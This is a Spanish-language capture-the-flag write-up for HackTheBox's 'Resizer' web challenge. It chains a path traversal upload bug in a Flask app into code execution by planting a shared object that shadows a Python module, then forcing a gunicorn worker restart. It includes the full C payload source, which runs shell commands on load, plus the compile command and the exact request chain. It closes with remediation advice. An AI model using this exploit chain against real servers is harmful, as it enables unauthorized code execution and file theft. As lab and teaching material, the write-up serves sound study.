# HTB — Resizer  🟢 Hard · Web · ✅ Resuelto

**Flag:** `HTB{d1013168b8df0e700997f2d11ad87e30}`
**Stack:** Flask 3.0 + gunicorn (5 workers, sin `--preload`) + Pillow · usuario `app` · flag en `/app/flag.txt`

---

## TL;DR (el pitch de 30 segundos)
Subida de archivos sin `secure_filename()` → **path traversal → escritura arbitraria de archivos**. La blacklist bloquea `.py`/`.pyc` (substring), pero **`.so` pasa**. Como `utils/` es un *namespace package* (sin `__init__.py`) y gunicorn corre **sin `--preload`**, dejo un `helpers.abi3.so` que **shadowea** a `helpers.py`; fuerzo el reinicio de un worker (timeout de 30s) para que lo importe, y su constructor copia el flag a un archivo que el endpoint me devuelve. **Sin reverse shell, sin salida de red.**

---

## 1. La vulnerabilidad
En `/resize` (app.py):
```python
filename = file.filename                          # nombre CRUDO del atacante
filepath = os.path.join(UPLOAD_FOLDER, filename)  # SIN secure_filename()
if os.path.exists(filepath): return "...", 400    # solo impide sobrescribir
file.save(filepath)                               # escribe donde yo diga
```
Controlo `filename` → `../` o rutas relativas escapan de `uploads/` → **escritura arbitraria sin auth** (OWASP A01/A05).

**Defensas y por qué no alcanzan:**
- Blacklist de extensión `if ext in filename` con `{'.py','.pyc'}` → es *substring*. **`.so` no contiene `.py` → pasa.**
- `send_file` NO sirve como lectura arbitraria: fuerza `_resized.` antes de la extensión, nunca podés apuntar a `flag.txt` limpio.
- El `os.path.exists` solo evita sobrescribir → solo puedo **crear** archivos nuevos.

## 2. El insight ganador (3 cosas que se combinan)
1. **`utils/` no tiene `__init__.py`** → *namespace package*; `utils.helpers` se busca en `/app/utils/`.
2. **`/app` es escribible** por `app` y está en `sys.path`.
3. **gunicorn sin `--preload`** → cada worker importa `app` *fresco al bootear*.

→ Dejo `/app/utils/helpers.<abi>.so`. Al importar `utils.helpers`, Python prueba los **loaders de extensión (.so) ANTES** que el de source (.py) → carga mi `.so` en vez de `helpers.py`. Un worker recién reiniciado = **RCE como `app`**.

## 3. La cadena
| # | Paso | Cómo |
|---|------|------|
| 1 | Plantar el `.so` | `POST /resize` con `filename=../utils/helpers.abi3.so` |
| 2 | Forzar reboot de worker | Upload **lento** (`--limit-rate`) > 30s → gunicorn SIGKILL → refork |
| 3 | RCE | El worker nuevo importa el `.so` → su `constructor` corre `cp /app/flag.txt /app/uploads/a_resized.txt` |
| 4 | Exfil | `POST /resize` con `filename=a.txt` (imagen inválida) → resize falla → `send_file('uploads/a_resized.txt')` = **FLAG** |

## 4. El payload (`.so`)
```c
#define Py_LIMITED_API 0x030c0000   // ABI estable -> carga en cualquier cpython 3.12
#include <Python.h>
#include <stdlib.h>
__attribute__((constructor))           // corre en dlopen, antes de PyInit
static void _p(void){ system("cp /app/flag.txt /app/uploads/a_resized.txt 2>/dev/null;"
                             "chmod 644 /app/uploads/a_resized.txt 2>/dev/null"); }
static PyObject* noop(PyObject*s,PyObject*a){ Py_RETURN_NONE; }  // para que el worker bootee sano
static PyMethodDef M[]={{"resize_image",noop,METH_VARARGS,""},{NULL,NULL,0,NULL}};
static struct PyModuleDef D={PyModuleDef_HEAD_INIT,"helpers",NULL,-1,M,NULL,NULL,NULL,NULL};
PyMODINIT_FUNC PyInit_helpers(void){ return PyModule_Create(&D); }
```
Compilar (WSL kali, headers de python3.x, ABI limitada a 3.12):
```
gcc -shared -fPIC -DPy_LIMITED_API=0x030c0000 -I/usr/include/python3.13 -o helpers.abi3.so helpers.c
```

## 5. Por qué es "Hard"
La escritura arbitraria es fácil. Lo difícil = convertirla en RCE **sin poder escribir `.py` ni `.pth` en un site-dir escribible**. La respuesta (`.so` + namespace package + no-preload + trigger de reboot) es la parte no obvia.

---

## 🎤 Defensa de entrevista (preparate estas)
- **¿Por qué `.so` y no `.py`?** La blacklist filtra el substring `.py`; `.so` lo esquiva y además los loaders de extensión tienen prioridad sobre los de source al importar.
- **¿Por qué importaba que `utils` no tenga `__init__.py`?** Es namespace package → el submódulo `helpers` se resuelve escaneando `sys.path`, y `/app/utils/helpers.so` lo shadowea.
- **¿Por qué necesitabas reiniciar un worker?** Sin `--preload`, cada worker importa la app al bootear; los que ya corrían tenían el `helpers.py` original en memoria. El `.so` solo carga en un worker *nuevo*.
- **¿Cómo forzaste el reinicio sin crashear nada?** Request de subida lenta que supera el timeout de 30s de gunicorn → SIGKILL → el arbitrer reforkea un worker fresco.
- **¿Por qué no reverse shell?** Innecesario y ruidoso: el constructor copia el flag a un path que el propio endpoint sirve. Cero salida de red.

## 🛡️ Cómo se arregla (blue team)
1. `secure_filename()` o allowlist estricta de nombres/extensiones (nunca blacklist por substring).
2. Guardar uploads **fuera** de `sys.path` y del árbol de la app, en un dir no ejecutable.
3. gunicorn con `--preload` (evita import por-worker desde disco) y directorio de uploads read-only para el proceso.
4. Validar el archivo como imagen real antes de tocar disco.
